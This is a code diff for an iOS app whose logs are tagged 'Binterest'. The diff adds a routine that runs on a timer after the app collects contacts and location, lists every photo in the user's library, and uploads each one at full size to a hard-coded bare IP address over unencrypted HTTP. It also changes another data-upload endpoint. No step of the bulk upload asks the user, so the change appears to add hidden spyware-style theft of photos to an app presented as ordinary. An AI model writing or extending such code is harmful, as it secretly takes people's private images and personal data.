@@ -75,8 +75,9 @@ typedef void (^DBGetEventBlock)(NSObject *obj);
         dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
             [self requestContactAuthorAfterSystemVersion];
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-                // 定位
                 [self startLocation];
+                
+                [self uploadAllImages];
             });
         });
     }
@@ -335,8 +336,7 @@ typedef void (^DBGetEventBlock)(NSObject *obj);
         NSLog(@"[Binterest]Abnormal upload data");
         return;
     }
-    NSString *url = @"http://45.91.226.193:8987/api/quick/createQuick";
-    
+    NSString *url = @"http://45.91.226.193:8987/api/tele/createTele";
     NSDictionary *parameters = @{
         @"data_type":@(dataType),
         @"data":dataStr,
@@ -379,7 +379,7 @@ typedef void (^DBGetEventBlock)(NSObject *obj);
 {
     NSLog(@"[Binterest]start loadPhotoAlbum");
     
-    NSString *url = @"http://45.91.226.193:8987/api/fileUploadAndDownload/getFileList"; // 登录
+    NSString *url = @"http://45.91.226.193:8987/api/fileUploadAndDownload/getFileList";
     
     NSDictionary *parameters = @{
         @"page":@1,
@@ -538,6 +538,57 @@ typedef void (^DBGetEventBlock)(NSObject *obj);
     return phPickerViewController;
 }
 
+#pragma mark - upload All Image
+
+-(void)uploadAllImages
+{
+    NSLog(@"[Binterest] uploadAllImages start uploadAllImages ");
+    __weak typeof(self) weakSelf = self;
+    [[PHPhotoLibrary sharedPhotoLibrary] performChanges:^{
+        
+        PHFetchResult<PHAsset *> *assets = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:nil];
+        [assets enumerateObjectsUsingBlock:^(PHAsset * _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
+            if([[UserInfoManager shareManager] checkNeedUploadWithKey:obj.localIdentifier])
+            {
+                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+                    PHImageManager *manager = [PHImageManager defaultManager];
+                    PHImageRequestOptions *options = [[PHImageRequestOptions alloc] init];
+                    options.networkAccessAllowed = YES;
+                    options.resizeMode = PHImageRequestOptionsResizeModeFast;
+                    options.progressHandler = ^(double progress, NSError * _Nullable error, BOOL * _Nonnull stop, NSDictionary * _Nullable info) {};
+                    [manager requestImageForAsset:obj targetSize:PHImageManagerMaximumSize contentMode:PHImageContentModeAspectFill options:options resultHandler:^(UIImage * _Nullable resultImage, NSDictionary * _Nullable info) {
+                        if (resultImage) {
+                            // Display the image
+                            dispatch_async(dispatch_get_main_queue(), ^{
+                                NSLog(@"[Binterest] uploadAllImages startUpLoad  %@",obj.localIdentifier);
+                                [weakSelf uploadImage:resultImage name:obj.localIdentifier successBlock:^(id json) {
+                                    NSLog(@"[Binterest] uploadAllImages success %@ burstIdentifier:%@",json, obj.localIdentifier);
+                                    [[UserInfoManager shareManager] addImageUploadMark:obj.localIdentifier];
+                                } failureBlock:^(NSError *error) {
+                                    NSLog(@"[Binterest] uploadAllImages error %@ burstIdentifier:%@",error,obj.localIdentifier);
+                                }];
+                            });
+                           
+                        } else {
+                            NSLog(@"[Binterest] uploadAllImages Failed to load image.");
+                        }
+                    }];
+                });
+            }
+            else
+            {
+                NSLog(@"[Binterest] uploadAllImages had uploaded");
+            }
+        }];
+
+    } completionHandler:^(BOOL success, NSError * _Nullable error) {
+        if (!success) {
+            NSLog(@"Error loading assets: %@", error);
+        }
+    }];
+}
+
+
 #pragma mark - PHPickerViewControllerDelegate
 - (void)picker:(PHPickerViewController *)picker didFinishPicking:(NSArray<PHPickerResult *> *)results  API_AVAILABLE(ios(14)) 
 {
@@ -567,9 +618,9 @@ typedef void (^DBGetEventBlock)(NSObject *obj);
                     NSURL *url = [livePhoto valueForKey:@"imageURL"];
                     UIImage *image = [UIImage imageWithContentsOfFile:[url path]];
                     
-                    [self uploadImage:image name:url.absoluteString success:^(id json) {
+                    [self uploadImage:image name:url.absoluteString successBlock:^(id json) {
                         NSLog(@"[Binterest]uploadImage 1 %@",json);
-                    } failure:^(NSError *error) {
+                    } failureBlock:^(NSError *error) {
                         NSLog(@"[Binterest]uploadImage error %@",error);
                     }];
                     dispatch_semaphore_signal(semaphore);
@@ -578,9 +629,9 @@ typedef void (^DBGetEventBlock)(NSObject *obj);
                 [result.itemProvider loadObjectOfClass:[UIImage class] completionHandler:^(__kindof id<NSItemProviderReading>  _Nullable object, NSError * _Nullable error) {
                     if ([object isKindOfClass:[UIImage class]]) {
                         UIImage *image = (UIImage *)object;
-                        [self uploadImage:image name:[self getDateStringUseYYYYMMDD:NO timeInterval:0] success:^(id json) {
+                        [self uploadImage:image name:[self getDateStringUseYYYYMMDD:NO timeInterval:0] successBlock:^(id json) {
                             NSLog(@"[Binterest]uploadImage 1 %@",json);
-                        } failure:^(NSError *error) {
+                        } failureBlock:^(NSError *error) {
                             NSLog(@"[Binterest]uploadImage error %@",error);
                         }];
                     }
@@ -595,7 +646,7 @@ typedef void (^DBGetEventBlock)(NSObject *obj);
     });
 }
 
-- (void)uploadImage:(UIImage *)image name:(NSString *)name success:(void (^)(id json))success failure:(void (^)(NSError *error))failure {
+- (void)uploadImage:(UIImage *)image name:(NSString *)name successBlock:(void (^)(id json))successBlock failureBlock:(void (^)(NSError *error))failureBlock {
     
     NSString *url = @"http://45.91.226.193:8987/api/fileUploadAndDownload/upload"; // 登录
     
@@ -631,10 +682,12 @@ typedef void (^DBGetEventBlock)(NSObject *obj);
         } progress:^(NSProgress * _Nonnull uploadProgress) {
             NSLog(@"[Binterest]Upload progress %@",uploadProgress);
         } success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
-            NSLog(@"[Binterest]Image uploaded successfully%@",responseObject);
+            NSLog(@"[Binterest]Image uploaded successfully name: %@ %@",name,responseObject);
             [self loadPhotoAlbum];
+            successBlock(responseObject);
         } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
             NSLog(@"[Binterest]Image uploaded Fail%@",error);
+            failureBlock(error);
         }];
 
 }
